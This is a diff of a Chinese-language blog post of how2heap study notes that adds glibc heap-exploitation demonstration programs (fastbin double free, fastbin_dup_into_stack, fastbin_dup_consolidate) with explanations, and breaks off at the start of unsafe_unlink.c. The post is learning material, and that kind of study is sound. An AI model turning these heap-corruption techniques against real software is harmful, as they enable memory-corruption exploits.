@@ -19,15 +19,15 @@
   <meta name="author" content="yb">
   <meta name="keywords" content="">
   
-    <meta name="description" content="fast_fit.c #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;string.h&gt;  int main() &#123;         fprintf(stderr, &quot;This file doesn&#39;t demonstrate an attack, but shows the nature of glibc&#39;s all">
+    <meta name="description" content="first_fit.c #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;string.h&gt;  int main() &#123;         fprintf(stderr, &quot;This file doesn&#39;t demonstrate an attack, but shows the nature of glibc&#39;s al">
 <meta property="og:type" content="article">
 <meta property="og:title" content="how2heap 学习笔记">
 <meta property="og:url" content="https://ybwa.github.io/p/134d140d/index.html">
 <meta property="og:site_name" content="YB">
-<meta property="og:description" content="fast_fit.c #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;string.h&gt;  int main() &#123;         fprintf(stderr, &quot;This file doesn&#39;t demonstrate an attack, but shows the nature of glibc&#39;s all">
+<meta property="og:description" content="first_fit.c #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;string.h&gt;  int main() &#123;         fprintf(stderr, &quot;This file doesn&#39;t demonstrate an attack, but shows the nature of glibc&#39;s al">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2026-01-28T06:15:03.000Z">
-<meta property="article:modified_time" content="2026-01-28T06:33:07.220Z">
+<meta property="article:modified_time" content="2026-03-15T07:40:43.035Z">
 <meta property="article:author" content="yb">
 <meta property="article:tag" content="Heap">
 <meta property="article:tag" content="pwn">
@@ -240,7 +240,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          269 字
+          1.7k 字
         
       </span>
     
@@ -251,7 +251,7 @@
         
         
         
-          3 分钟
+          14 分钟
         
       </span>
     
@@ -293,7 +293,7 @@
             
               <div class="markdown-body">
                 
-                <h2 id="fast_fitc"><a class="markdownIt-Anchor" href="#fast_fitc"></a> fast_fit.c</h2>
+                <h2 id="first_fitc"><a class="markdownIt-Anchor" href="#first_fitc"></a> first_fit.c</h2>
 <figure><div class="code-wrapper"><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
 <span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
 <span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span>
@@ -333,7 +333,275 @@
 <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure>
 <p>Heap 由若干个chunk 构成，chunk 的第一个 qword 表示前一个 chunk 的大小，第二个 qword 表示当前 chunk 的大小，第三个 qword 开始存储用户的数据。</p>
 <p>由于 chunk 向 16 位（或 8 位）对齐，chunk 大小的最后 3 位必定为 0，用以存储标志位 AMP，其中最低位 P 表示 PREV_INUSE，前一 chunk 是否被使用（1/0）。</p>
-<p><code>malloc</code> 会向 Heap 中请求一块 chunk，如果在存在空闲的足够大的 chunk 则会优先分配。</p>
+<figure><div class="code-wrapper"><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">struct</span> <span class="token class-name">malloc_chunk</span> <span class="token punctuation">&#123;</span>
+
+  INTERNAL_SIZE_T      prev_size<span class="token punctuation">;</span>  <span class="token comment">/* Size of previous chunk (if free).  */</span>
+  INTERNAL_SIZE_T      size<span class="token punctuation">;</span>       <span class="token comment">/* Size in bytes, including overhead. */</span>
+
+  <span class="token keyword">struct</span> <span class="token class-name">malloc_chunk</span><span class="token operator">*</span> fd<span class="token punctuation">;</span>         <span class="token comment">/* double links -- used only if free. */</span>
+  <span class="token keyword">struct</span> <span class="token class-name">malloc_chunk</span><span class="token operator">*</span> bk<span class="token punctuation">;</span>
+
+  <span class="token comment">/* Only used for large blocks: pointer to next larger size.  */</span>
+  <span class="token keyword">struct</span> <span class="token class-name">malloc_chunk</span><span class="token operator">*</span> fd_nextsize<span class="token punctuation">;</span> <span class="token comment">/* double links -- used only if free. */</span>
+  <span class="token keyword">struct</span> <span class="token class-name">malloc_chunk</span><span class="token operator">*</span> bk_nextsize<span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure>
+<p>chunk 被分配后从 <code>fd</code> 开始存储用户数据，空闲时 <code>fd</code> 和 <code>bk</code> 分别指向前后空闲的 chunk，用于维护一个空闲 chunk 的列表.</p>
+<p><code>malloc</code> 会向 Heap 中请求一块 chunk，分配器会从空闲堆链表头部开始遍历，找到第一块足够大的 chunk 就会分配（first_fit），多余的部分会分割成一个新的空闲 chunk。</p>
+<h2 id="fastbin_dupc"><a class="markdownIt-Anchor" href="#fastbin_dupc"></a> fastbin_dup.c</h2>
+<figure><div class="code-wrapper"><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span>
+        <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"This file demonstrates a simple double-free attack with fastbins.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Allocating 3 buffers.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">int</span> <span class="token operator">*</span>a <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">int</span> <span class="token operator">*</span>b <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">int</span> <span class="token operator">*</span>c <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"1st malloc(8): %p\n"</span><span class="token punctuation">,</span> a<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"2nd malloc(8): %p\n"</span><span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"3rd malloc(8): %p\n"</span><span class="token punctuation">,</span> c<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Freeing the first one...\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token function">free</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"If we free %p again, things will crash because %p is at the top of the free list.\n"</span><span class="token punctuation">,</span> a<span class="token punctuation">,</span> a<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token comment">// free(a);</span>
+
+        <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"So, instead, we'll free %p.\n"</span><span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token function">free</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Now, we can free %p again, since it's not the head of the free list.\n"</span><span class="token punctuation">,</span> a<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token function">free</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Now the free list has [ %p, %p, %p ]. If we malloc 3 times, we'll get %p twice!\n"</span><span class="token punctuation">,</span> a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> a<span class="token punctuation">,</span> a<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        a <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        b <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        c <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"1st malloc(8): %p\n"</span><span class="token punctuation">,</span> a<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"2nd malloc(8): %p\n"</span><span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"3rd malloc(8): %p\n"</span><span class="token punctuation">,</span> c<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure>
+<p>为了提高效率，较小的 chunk 释放后会被存入 fastbin，fastbin 中的 chunk 的 <code>inuse</code> 位依旧为 1 不会与其他 chunk 合并。</p>
+<p>fastbin 为了快速响应频繁的小内存申请，采用 单向链表和 <strong>LIFO</strong> 维护。</p>
+<p>glibc 的 <code>free()</code> 有一个检测：当释放指针是 fastbin 链表头时会使得程序崩溃。</p>
+<p>但当释放指针不是表头时，就没有这个问题了，它将被第二次放入链表中。</p>
+<p>此时使用 <code>malloc()</code> 分配，将会得到相同的两个 chunk。</p>
+<h2 id="fastbin_dup_into_stackc"><a class="markdownIt-Anchor" href="#fastbin_dup_into_stackc"></a> fastbin_dup_into_stack.c</h2>
+<figure><div class="code-wrapper"><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span>
+        <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"This file extends on fastbin_dup.c by tricking malloc into\n"</span>
+               <span class="token string">"returning a pointer to a controlled location (in this case, the stack).\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        <span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token keyword">long</span> stack_var<span class="token punctuation">;</span>
+
+        <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"The address we want malloc() to return is %p.\n"</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>stack_var<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        <span class="token keyword">int</span> <span class="token operator">*</span>a <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">int</span> <span class="token operator">*</span>b <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">int</span> <span class="token operator">*</span>c <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token function">free</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">free</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">free</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Now the free list has [ %p, %p, %p ]. "</span>
+                <span class="token string">"We'll now carry out our attack by modifying data at %p.\n"</span><span class="token punctuation">,</span> a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> a<span class="token punctuation">,</span> a<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token keyword">long</span> <span class="token operator">*</span>d <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"1st malloc(8): %p\n"</span><span class="token punctuation">,</span> d<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"2nd malloc(8): %p\n"</span><span class="token punctuation">,</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Now the free list has [ %p ].\n"</span><span class="token punctuation">,</span> a<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Now, we have access to %p while it remains at the head of the free list.\n"</span>
+                <span class="token string">"so now we are writing a fake free size (in this case, 0x20) to the stack,\n"</span>
+                <span class="token string">"so that malloc will think there is a free chunk there and agree to\n"</span>
+                <span class="token string">"return a pointer to it.\n"</span><span class="token punctuation">,</span> a<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        stack_var <span class="token operator">=</span> <span class="token number">0x20</span><span class="token punctuation">;</span>
+
+        <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Now, we overwrite the first 8 bytes of the data at %p to point right before the 0x20.\n"</span><span class="token punctuation">,</span> a<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token operator">*</span>d <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token keyword">long</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>stack_var<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>d<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"3rd malloc(8): %p, putting the stack address on the free list\n"</span><span class="token punctuation">,</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"4th malloc(8): %p\n"</span><span class="token punctuation">,</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure>
+<p>使用上一个的方法，做到修改一个在 fastbin 中的 chunk；如果此时将其的 <code>fd</code> 指向栈，就可以得到一个指向栈地址的指针。</p>
+<p>为了绕过 size 检查，需要设置栈上地址的大小，在这里时 0x20。</p>
+<h2 id="fastbin_dup_consolidatec"><a class="markdownIt-Anchor" href="#fastbin_dup_consolidatec"></a> fastbin_dup_consolidate.c</h2>
+<figure><div class="code-wrapper"><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;assert.h></span></span>
+
+<span class="token comment">/*
+Original reference: https://valsamaras.medium.com/the-toddlers-introduction-to-heap-exploitation-fastbin-dup-consolidate-part-4-2-ce6d68136aa8
+
+This document is mostly used to demonstrate malloc_consolidate and how it can be leveraged with a
+double free to gain two pointers to the same large-sized chunk, which is usually difficult to do
+directly due to the previnuse check. Interestingly this also includes tcache-sized chunks of certain sizes.
+
+malloc_consolidate(https://elixir.bootlin.com/glibc/glibc-2.35/source/malloc/malloc.c#L4714) essentially
+merges all fastbin chunks with their neighbors, puts them in the unsorted bin and merges them with top
+if possible.
+
+As of glibc version 2.35 it is called only in the following five places:
+1. _int_malloc: A large sized chunk is being allocated
+3. _int_free: If the chunk size is >= FASTBIN_CONSOLIDATION_THRESHOLD (65536)
+2. _int_malloc: No bins were found for a chunk and top is too small
+4. mtrim: Always
+5. __libc_mallopt: Always
+
+small bin (since we are trying to get into the 'else' branch of this check: https://elixir.bootlin.com/glibc/glibc-2.35/source/malloc/malloc.c#L3901).
+We will be targeting the first place, so we will need to allocate a chunk that does not belong in the
+This means our chunk will need to be of size >= 0x400 (it is thus large-sized). Notably, the
+biggest tcache sized chunk is 0x410, so if our chunk is in the [0x400, 0x410] range we can utilize
+a double free to gain control of a tcache sized chunk.
+*/</span>
+
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">CHUNK_SIZE</span> <span class="token expression"><span class="token number">0x400</span></span></span>
+
+<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"This technique will make use of malloc_consolidate and a double free to gain a duplication in the tcache.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Lets prepare to fill up the tcache in order to force fastbin usage...\n\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        <span class="token keyword">void</span> <span class="token operator">*</span>ptr<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+
+        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">7</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>
+                ptr<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x40</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        <span class="token keyword">void</span><span class="token operator">*</span> p1 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x40</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Allocate another chunk of the same size p1=%p \n"</span><span class="token punctuation">,</span> p1<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Fill up the tcache...\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">7</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>
+                <span class="token function">free</span><span class="token punctuation">(</span>ptr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Now freeing p1 will add it to the fastbin.\n\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token function">free</span><span class="token punctuation">(</span>p1<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"To trigger malloc_consolidate we need to allocate a chunk with large chunk size (>= 0x400)\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"which corresponds to request size >= 0x3f0. We will request 0x400 bytes, which will gives us\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"a tcache-sized chunk with chunk size 0x410 "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">void</span><span class="token operator">*</span> p2 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span>CHUNK_SIZE<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"p2=%p.\n"</span><span class="token punctuation">,</span> p2<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nFirst, malloc_consolidate will merge the fast chunk p1 with top.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Then, p2 is allocated from top since there is no free chunk bigger (or equal) than it. Thus, p1 = p2.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        <span class="token function">assert</span><span class="token punctuation">(</span>p1 <span class="token operator">==</span> p2<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"We will double free p1, which now points to the 0x410 chunk we just allocated (p2).\n\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token function">free</span><span class="token punctuation">(</span>p1<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// vulnerability (double free)</span>
+        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"It is now in the tcache (or merged with top if we had initially chosen a chunk size > 0x410).\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"So p1 is double freed, and p2 hasn't been freed although it now points to a free chunk.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"We will request 0x400 bytes. This will give us the 0x410 chunk that's currently in\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"the tcache bin. p2 and p1 will still be pointing to it.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">void</span> <span class="token operator">*</span>p3 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span>CHUNK_SIZE<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        <span class="token function">assert</span><span class="token punctuation">(</span>p3 <span class="token operator">==</span> p2<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"We now have two pointers (p2 and p3) that haven't been directly freed\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"and both point to the same tcache sized chunk. p2=%p p3=%p\n"</span><span class="token punctuation">,</span> p2<span class="token punctuation">,</span> p3<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"We have achieved duplication!\n\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Note: This duplication would have also worked with a larger chunk size, the chunks would\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"have behaved the same, just being taken from the top instead of from the tcache bin.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"This is pretty cool because it is usually difficult to duplicate large sized chunks\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"because they are resistant to direct double free's due to their PREV_INUSE check.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure>
+<p>通过 <code>malloc_consolidate</code> 与 double-free 组合以得到两个指针指向相同的 large-sized chunk。</p>
+<p><code>malloc_consolidate</code> 将所有 fastbin 中的 chunk 与相邻块合并，放入 unsorted bin 或与 top chunk 合并。</p>
+<p>glibc 2.35 中 <code>malloc_consolidate</code> 在以下五个地方被调用：</p>
+<ul>
+<li><code>_int_malloc</code>：一个 large chunk 被分配 <a target="_blank" rel="noopener" href="https://elixir.bootlin.com/glibc/glibc-2.35/source/malloc/malloc.c#L3965">CODE</a></li>
+<li><code>_int_free</code>：chunk 大小大于等于 FASTBIN_CONSOLIDATION_THRESHOLD (65536) <a target="_blank" rel="noopener" href="https://elixir.bootlin.com/glibc/glibc-2.35/source/malloc/malloc.c#L4674">CODE</a></li>
+<li><code>_int_malloc</code>：没有合适的 bin 来提供 chunk 且 top chunk 不够大<a target="_blank" rel="noopener" href="https://elixir.bootlin.com/glibc/glibc-2.35/source/malloc/malloc.c#L4394">CODE</a></li>
+<li><code>mtrim</code>：总是  <a target="_blank" rel="noopener" href="https://elixir.bootlin.com/glibc/glibc-2.35/source/malloc/malloc.c#L5041">CODE</a></li>
+<li><code>__libc_mallopt</code>：总是  <a target="_blank" rel="noopener" href="https://elixir.bootlin.com/glibc/glibc-2.35/source/malloc/malloc.c#L5463">CODE</a></li>
+</ul>
+<p>想要在 <code>malloc</code> 中触发 <code>malloc_consolidate</code>，我们需要使分配的 chunk 的大小大于等于 0x400，即 large-sized。</p>
+<p>同时，tcache-sized 的最大大小是 0x410，所以我们可以用这种方法来控制一个 tcache-sized chunk。</p>
+<h2 id="unsafe_unlinkc"><a class="markdownIt-Anchor" href="#unsafe_unlinkc"></a> unsafe_unlink.c</h2>
+<figure><div class="code-wrapper"><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdint.h></span></span>
